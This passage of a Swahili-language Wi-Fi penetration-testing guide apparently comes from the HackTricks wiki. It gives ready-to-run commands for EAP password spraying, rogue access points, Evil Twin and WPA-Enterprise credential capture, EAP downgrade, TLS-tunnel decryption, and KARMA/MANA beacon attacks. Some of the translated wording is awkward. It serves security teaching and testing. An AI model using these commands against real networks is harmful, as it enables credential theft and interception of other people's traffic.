Bila kujali itifaki iliyochaguliwa, seva ya PEAP/TTLS inapata ufahamu wa kitambulisho halisi cha mtumiaji baada ya handaki la TLS kuwekwa. Kitambulisho halisi kinaweza kuwakilishwa kama mtumiaji@eneo au tu mtumiaji. Ikiwa seva ya PEAP/TTLS pia inahusika na kuthibitisha mtumiaji, sasa inamiliki kitambulisho cha mtumiaji na kuendelea na mbinu ya uwakilishi iliyolindwa na handaki la TLS. Vinginevyo, seva ya PEAP/TTLS inaweza kupeleka ombi jipya la RADIUS kwa seva ya RADIUS ya nyumbani ya mtumiaji. Ombi jipya la RADIUS hili halijumuishi safu ya itifaki ya PEAP au TTLS. Katika hali ambapo mbinu iliyolindwa ya uwakilishi ni EAP, ujumbe wa ndani wa EAP unatumwa kwa seva ya RADIUS ya nyumbani bila bapa ya EAP-PEAP au EAP-TTLS. Sifa ya Jina la Mtumiaji ya ujumbe wa RADIUS unaoondoka ina kitambulisho halisi cha mtumiaji, ikichukua nafasi ya Jina la Mtumiaji anonim kutoka kwa ombi la RADIUS linaloingia. Wakati mbinu iliyolindwa ya uwakilishi ni PAP au CHAP (inayoungwa mkono tu na TTLS), sifa ya Jina la Mtumiaji na sifa zingine za uwakilishi zilizochimbuliwa kutoka kwa mzigo wa TLS zinachukua nafasi katika ujumbe wa RADIUS unaoondoka, zikichukua nafasi ya Jina la Mtumiaji anonim na sifa ya TTLS EAP-Ujumbe zilizopatikana katika ombi la RADIUS linaloingia.

Kwa habari zaidi angalia [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (spray ya nywila)

Ikiwa mteja anatarajiwa kutumia **jina la mtumiaji na nywila** (tambua kuwa **EAP-TLS haitakuwa halali** katika kesi hii), basi unaweza kujaribu kupata **orodha** ya **majina ya watumiaji** (ona sehemu inayofuata) na **nywila** na kujaribu **kuvunja nguvu** upatikanaji kwa kutumia [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Ungekuwa pia unaweza kufanya shambulio hili kwa kutumia `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Nadharia za Mashambulizi ya Wateja

### Uchaguzi wa Mtandao na Kutembea

* Itifaki ya 802.11 inaeleza jinsi kituo kinavyojiunga na Seti ya Huduma Iliyozidishwa (ESS) lakini haielezi vigezo vya kuchagua ESS au kituo cha kupata (AP) ndani yake.
* Vituo vinaweza kutembea kati ya APs zinazoshiriki ESSID moja, kudumisha uunganisho kote jengo au eneo.
* Itifaki inahitaji kituo kujithibitisha kwa ESS lakini haikazi AP kujithibitisha kwa kituo.

### Orodha za Mtandao Uliopendelewa (PNLs)

* Vituo huhifadhi ESSID ya kila mtandao wa waya wanapounganika nao kwenye Orodha yao ya Mtandao Uliopendelewa (PNL), pamoja na maelezo maalum ya usanidi wa mtandao.
* PNL hutumiwa kujiunga moja kwa moja na mitandao inayojulikana, ikiboresha uzoefu wa mtumiaji kwa kufanya mchakato wa uunganisho kuwa laini.

### Uchunguzi wa Kusikiliza

* APs hutoa mfululizo wa fremu za bendera mara kwa mara, zikiitangaza uwepo wao na sifa, ikiwa ni pamoja na ESSID ya AP isipokuwa utangazaji umefungwa.
* Wakati wa uchunguzi wa kusikiliza, vituo husikiliza fremu za bendera. Ikiwa ESSID ya bendera inalingana na kuingia kwenye PNL ya kituo, kituo kinaweza kujiunga moja kwa moja na AP hiyo.
* Maarifa ya PNL ya kifaa inaweza kusababisha unyanyasaji wa uwezekano kwa kufanana na ESSID ya mtandao uliojulikana, kuwadanganya vifaa kujiunga na AP bandia.

### Uchunguzi wa Moja kwa Moja

* Uchunguzi wa moja kwa moja unahusisha vituo kutuma maombi ya uchunguzi kugundua APs karibu na sifa zao.
* Maombi ya uchunguzi yaliyoelekezwa yanamlenga ESSID maalum, kusaidia kugundua ikiwa mtandao fulani uko ndani ya umbali, hata kama ni mtandao uliofichwa.
* Maombi ya uchunguzi ya utangazaji yana uga wa SSID wa null na hutumwa kwa APs zote karibu, kuruhusu kituo kuchunguza mtandao wowote uliopendelewa bila kufichua maudhui ya PNL yake.
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Unda faili ya config `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Kisha **weka IPs** na **njia**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Na kisha **anza** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Unda faili ya usanidi `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Acha michakato inayosumbua**, weka **hali ya ufuatiliaji**, na **anza hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Kusonga na Uelekezaji
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Kaka Mwovu

Shambulizi la kaka mwovu linatumia njia ambayo wateja wa WiFi wanatambua mitandao, hasa wakitegemea jina la mtandao (ESSID) bila kuhitaji kituo cha msingi (pointi ya kufikia) kujithibitisha kwa mteja. Mambo muhimu ni pamoja na:

- **Ugumu wa Kutofautisha**: Vifaa vinashindwa kutofautisha kati ya pointi za kufikia halali na zisizo halali wakati zinashiriki ESSID na aina ile ile ya kificho. Mitandao halisi mara nyingi hutumia pointi za kufikia nyingi zenye ESSID moja kwa kusudi la kupanua chanjo kwa urahisi.
- **Roaming ya Mteja na Udanganyifu wa Uunganisho**: Itifaki ya 802.11 inaruhusu vifaa kutembea kati ya pointi za kufikia ndani ya ESS moja. Wadukuzi wanaweza kutumia hili kwa kumshawishi kifaa kujitenga na kituo chake cha sasa na kuunganisha kwenye kaka mwovu. Hii inaweza kufanikiwa kwa kutoa ishara yenye nguvu zaidi au kuvuruga uhusiano na pointi halali ya kufikia kupitia njia kama vile pakiti za kudeauthenticate au kuziba.
- **Makadirio katika Utekelezaji**: Kutekeleza shambulizi la kaka mwovu kwa mafanikio katika mazingira yenye pointi nyingi, zilizowekwa vizuri za kufikia kunaweza kuwa changamoto. Kudeauthenticate pointi moja halali ya kufikia mara nyingi husababisha kifaa kuunganisha kwenye pointi nyingine halali ya kufikia isipokuwa muhusika aweze kudeauthenticate pointi zote zilizo karibu au kuweka kwa makini pointi ya kufikia ya kaka mwovu.
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Unaweza pia kuunda Evil Twin ukitumia **eaphammer** (kumbuka kwamba ili kuunda evil twins na eaphammer kiolesura **HAIPASWI kuwa** katika hali ya **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Au kutumia Airgeddon: `Chaguo: 5,6,7,8,9 (kwenye menyu ya shambulio la Evil Twin).`

![](<../../.gitbook/assets/image (1088).png>)

Tafadhali, kumbuka kwamba kwa chaguo-msingi ikiwa ESSID katika PNL imesave kama iliyolindwa na WPA, kifaa hakitaji kuunganisha moja kwa moja kwa Evil Twin ya Open. Unaweza kujaribu kufanya DoS kwa AP halisi na kumatumaini mtumiaji ataunganisha kwa mkono kwa Evil Twin yako ya Open, au unaweza kufanya DoS kwa AP halisi na kutumia WPA Evil Twin kuchukua handshake (ukitumia njia hii hutaweza kuruhusu mwathiriwa kuunganisha kwako kwa sababu hujui PSK, lakini unaweza kuchukua handshake na kujaribu kuivunja).

_Baadhi ya OS na AV zitamwonya mtumiaji kwamba kuunganisha kwenye mtandao wa Open ni hatari..._

### WPA/WPA2 Evil Twin

Unaweza kuunda **Evil Twin ukitumia WPA/2** na ikiwa vifaa vimeboreshwa kuunganisha kwenye SSID hiyo na WPA/2, watajaribu kuunganisha. Hata hivyo, **kukamilisha handshake ya 4-hatua** unahitaji pia **kujua** **nenosiri** ambalo mteja atatumia. Ikiwa **hulijui**, **unganisho halitakamilika**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Twin ya Kibiashara ya Uovu

Ili kuelewa mashambulizi haya ningependekeza kusoma kwanza maelezo mafupi ya [ufafanuzi wa WPA Kibiashara](./#wpa-enterprise-mgt).

**Kutumia hostapd-wpe**

`hostapd-wpe` inahitaji faili ya **mipangilio** ili kufanya kazi. Ili **kutumia** kizazi cha mipangilio hii kiotomatiki unaweza kutumia [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (pakua faili ya python ndani ya _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Katika faili ya usanidi unaweza kuchagua mambo mengi tofauti kama vile ssid, channel, faili za mtumiaji, cret/key, vigezo vya dh, toleo la wpa na uthibitishaji...

[**Kutumia hostapd-wpe na EAP-TLS kuruhusu cheti chochote kuingia.**](evil-twin-eap-tls.md)

**Kutumia EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Kwa chaguo-msingi, EAPHammer hutumia njia za uwakiki hizi (tambua GTC kama ya kwanza kujaribu kupata nywila za maandishi wazi na kisha matumizi ya njia za uwakiki zenye nguvu zaidi):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Hii ni mbinu ya msingi ya kuepuka muda mrefu wa kuunganisha. Hata hivyo, unaweza pia kuelekeza kwa seva njia za uthibitishaji kutoka dhaifu hadi imara zaidi:
```
--negotiate weakest
```
Au unaweza kutumia:

* `--negotiate gtc-downgrade` kutumia utekelezaji wa GTC downgrade wenye ufanisi mkubwa (nywila za maandishi wazi)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` kuspecify kwa mkono njia zinazotolewa (kutoa njia sawa za uthibitisho kwa mpangilio sawa na shirika kushambuliwa kutakuwa vigumu zaidi kugundua).
* [Pata habari zaidi kwenye wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Kutumia Airgeddon**

`Airgeddon` inaweza kutumia vyeti vilivyotengenezwa awali kutoa uthibitisho wa EAP kwa mitandao ya WPA/WPA2-Enterprise. Mtandao bandia utashusha itifaki ya uunganisho hadi EAP-MD5 ili iweze **kukamata mtumiaji na MD5 ya nywila**. Baadaye, mshambuliaji anaweza kujaribu kuvunja nywila.\
`Airggedon` inakupa uwezekano wa **shambulio la Twin Bovu linaloendelea (kelele)** au **kuunda shambulio la Twin Bovu mpaka mtu anapounganisha (nyororo).**

![](<../../.gitbook/assets/image (936).png>)

### Kutatua Msaada wa PEAP na EAP-TTLS TLS katika mashambulizi ya Twin Bovu

_Mbinu hii ilijaribiwa kwenye uunganisho wa PEAP lakini kwa kuwa ninadondoa handaki la TLS la kiholela hii pia inapaswa kufanya kazi na EAP-TTLS_

Ndani ya **mipangilio** ya _hostapd-wpe_ **comment** mstari unaotaja _**dh\_file**_ (kutoka `dh_file=/etc/hostapd-wpe/certs/dh` hadi `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Hii itafanya `hostapd-wpe` **kubadilishana funguo kwa kutumia RSA** badala ya DH, hivyo utaweza **kudondoa** trafiki baadaye **ukijua funguo binafsi la seva**.

Sasa anzisha **Twin Bovu** kutumia **`hostapd-wpe`** na maelezo yaliyobadilishwa kama kawaida. Pia, anzisha **`wireshark`** kwenye **interface** inayofanya shambulio la Twin Bovu.

Sasa au baadaye (unapokuwa umeshakamata baadhi ya nia za uthibitisho) unaweza kuongeza funguo binafsi la RSA kwa wireshark katika: `Edit --> Mapendeleo --> Itifaki --> TLS --> (Orodha ya funguo za RSA) Hariri...`

Ongeza kuingia mpya na jaza fomu na thamani hizi: **Anwani ya IP = yoyote** -- **Bandari = 0** -- **Itifaki = data** -- **Faili ya Funguo** (**chagua faili yako ya funguo**, kuepuka matatizo chagua faili ya funguo **bila kulindwa na nywila**).

![](<../../.gitbook/assets/image (687).png>)

Na angalia kwenye **kichupo kipya cha "TLS iliyodondolewa"**:

![](<../../.gitbook/assets/image (231).png>)

## KARMA, MANA, MANA ya Kelele na shambulio la Beacons Lililofahamika

### Orodha nyeusi/nyeupe ya ESSID na MAC

Aina tofauti za Orodha za Kudhibiti Upatikanaji wa Vyombo vya Habari (MFACLs) na njia zao zinazolingana na athari kwenye tabia ya Kituo cha Upatikanaji cha Bovu (AP):

1. **Orodha nyeupe kulingana na MAC**:
* Kituo cha Bovu kitajibu tu maombi ya uchunguzi kutoka kwa vifaa vilivyoorodheshwa kwenye orodha nyeupe, kubaki haionekani kwa wengine wote ambao hawajatajwa.
2. **Orodha nyeusi kulingana na MAC**:
* Kituo cha Bovu kitapuuza maombi ya uchunguzi kutoka kwa vifaa kwenye orodha nyeusi, kufanya Kituo cha Bovu kuwa haionekani kwa vifaa maalum hivyo.
3. **Orodha nyeupe kulingana na ESSID**:
* Kituo cha Bovu kitajibu maombi ya uchunguzi tu kwa ESSIDs maalum yaliyoorodheshwa, kufanya iwe haionekani kwa vifaa ambavyo Orodha zao za Mtandao Uliopendelewa (PNLs) hazina ESSIDs hizo.
4. **Orodha nyeusi kulingana na ESSID**:
* Kituo cha Bovu hakitajibu maombi ya uchunguzi kwa ESSIDs maalum kwenye orodha nyeusi, kufanya iwe haionekani kwa vifaa vinavyotafuta mitandao hiyo maalum.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Mbinu hii inaruhusu **mshambuliaji kuunda kituo cha upatikanaji (AP) cha malicious kinachojibu maombi yote ya uchunguzi** kutoka kwa vifaa vinavyotafuta kuunganisha mitandao. Mbinu hii **inawadanganya vifaa kuunganisha kwenye AP ya mshambuliaji** kwa kufanana mitandao ambayo vifaa vinatafuta. Mara tu kifaa kinapotuma ombi la kuunganisha kwenye AP ya udanganyifu huu, inakamilisha uunganisho, ikisababisha kifaa kuunganisha kimakosa kwenye mtandao wa mshambuliaji.

### MANA

Kisha, **vifaa vikaanza kupuuza majibu yasiyohitajika ya mtandao**, kupunguza ufanisi wa shambulio la karma la awali. Hata hivyo, mbinu mpya, inayoitwa **shambulio la MANA**, iliwasilishwa na Ian de Villiers na Dominic White. Mbinu hii inahusisha AP ya udanganyifu **kukamata Orodha ya Mtandao Ulio Pendwa (PNL) kutoka kwa vifaa kwa kujibu maombi yao ya uchunguzi wa matangazo** na majina ya mitandao (SSIDs) ambayo hapo awali yalitafutwa na vifaa. Shambulio hili la kisasa linapuuza kinga dhidi ya shambulio la karma la awali kwa kutumia njia vifaa vinavyokumbuka na kipaumbele mitandao inayojulikana.

Shambulio la MANA linafanya kazi kwa kufuatilia maombi ya uchunguzi yaliyoelekezwa na yale ya matangazo kutoka kwa vifaa. Kwa maombi yaliyoelekezwa, inarekodi anwani ya MAC ya kifaa na jina la mtandao lililoulizwa, ikiongeza habari hii kwenye orodha. Wakati ombi la matangazo linapopokelewa, AP inajibu na habari inayolingana na mitandao yoyote kwenye orodha ya kifaa, kuchochea kifaa kuunganisha kwenye AP ya udanganyifu.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Kishambulizi cha MANA Kwa Sauti

**Kishambulizi cha MANA kwa sauti** ni mkakati wa juu unapotumika vifaa havitumii uchunguzi uliolengwa au wakati Orodha zao za Mtandao Uliopendelewa (PNL) hazijulikani kwa mshambuliaji. Inafanya kazi kwa msingi kwamba **vifaa katika eneo moja huenda wakashiriki baadhi ya majina ya mtandao katika PNL zao**. Badala ya kujibu kwa uchaguzi, shambulizi hili linatangaza majibu ya uchunguzi kwa kila jina la mtandao (ESSID) lililopatikana katika PNL zilizounganishwa za vifaa vilivyochunguzwa. Hatua hii pana inaongeza nafasi ya kifaa kutambua mtandao wa kawaida na kujaribu kuunganisha kwenye Pointi ya Kufikia ya Kijanja (AP) ya udanganyifu.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Shambulizi la Alama Inayojulikana

Wakati **shambulizi la MANA kubwa** linaweza isiwe ya kutosha, **shambulizi la Alama Inayojulikana** linatoa njia nyingine. Mbinu hii **inajaribu kujaribu mchakato wa uunganisho kwa kusimuliza AP ambayo inajibu jina lolote la mtandao, ikizungusha orodha ya ESSIDs inayowezekana** iliyopatikana kutoka kwa orodha ya maneno. Hii inasimuliza uwepo wa mitandao mingi, ikitarajia kupata ESSID ndani ya PNL ya muathiriwa, kusababisha jaribio la kuunganisha kwenye AP bandia. Shambulizi linaweza kuongezwa nguvu kwa kuliunganisha na chaguo la `--loud` kwa jaribio kali zaidi la kuwavizia vifaa.

Eaphammer ilitumia shambulizi hili kama shambulizi la MANA ambapo ESSIDs zote ndani ya orodha zinachajiwa (unaweza pia kulichanganya na `--loud` ili kuunda shambulizi la MANA Kubwa + Alama Inayojulikana):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Shambulizi la Mlipuko wa Alama Inayojulikana**

**Shambulizi la Mlipuko wa Alama Inayojulikana** linahusisha **utangazaji wa haraka wa fremu za alama kwa kila ESSID iliyoorodheshwa katika faili**. Hii inajenga mazingira yenye msongamano wa mitandao bandia, ikiongeza sana uwezekano wa vifaa kuunganisha kwenye AP bandia, hasa wakati inapoambatishwa na shambulizi la MANA. Mbinu hii inatumia kasi na wingi kushinda mifumo ya uteuzi wa mtandao wa vifaa.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** ni itifaki inayowezesha vifaa kuunganishwa moja kwa moja kwa kutumia Wi-Fi bila haja ya kufanya kazi kupitia kwenye kituo cha upatikanaji wa wireless cha kawaida. Uwezo huu umewekwa ndani ya vifaa mbalimbali vya Internet of Things (IoT), kama vile wachapishaji na televisheni, kurahisisha mawasiliano moja kwa moja kati ya vifaa. Sifa muhimu ya Wi-Fi Direct ni kwamba kifaa kimoja huchukua jukumu la kituo cha upatikanaji, kinachoitwa mmiliki wa kikundi, kusimamia uhusiano.

Usalama kwa uhusiano wa Wi-Fi Direct unawekwa kupitia **Wi-Fi Protected Setup (WPS)**, ambayo inasaidia njia kadhaa za kuunganisha kwa usalama, ikiwa ni pamoja na:

* **Usanidi wa Kifungo cha Kusukuma (PBC)**
* **Kuingiza PIN**
* **Mawasiliano ya Karibu ya NFC**

Njia hizi, hasa kuingiza PIN, ziko hatarini kwa mapungufu sawa na WPS katika mitandao ya Wi-Fi ya kawaida, hivyo kuwafanya kuwa malengo ya njia za mashambulizi sawa.

### Utekaji wa EvilDirect

**Utekaji wa EvilDirect** ni shambulio maalum kwa Wi-Fi Direct. Linajumuisha dhana ya shambulio la Evil Twin lakini linawalenga uhusiano wa Wi-Fi Direct. Katika kesi hii, mkaidi anajifanya kuwa mmiliki halali wa kikundi kwa lengo la kuwapotosha vifaa kuunganisha na kifaa cha uovu. Njia hii inaweza kutekelezwa kwa kutumia zana kama vile `airbase-ng` kwa kutoa maelezo ya kituo, ESSID, na anwani ya MAC ya kifaa kilichojifanya:

## Marejeo

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Angalia [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (ingia kwa kutumia facebook na udanganyifu wa WPA kwenye malango ya kufungwa)

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ili kuwasiliana na wakaidi wenye uzoefu na wawindaji wa tuzo za makosa ya usalama!

**Machapisho ya Kuhack**\
Shiriki na maudhui yanayochimba kina kuhusu msisimko na changamoto za kuhack

**Taarifa za Kuhack za Muda Halisi**\
Kaa up-to-date na ulimwengu wa kuhack wenye kasi kupitia taarifa na ufahamu wa muda halisi

**Matangazo ya Karibuni**\
Baki mwelekezi na tuzo mpya za makosa zinazoanzishwa na sasisho muhimu ya jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wakaidi bora leo!

<details>

<summary><strong>Jifunze kuhack AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha** [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
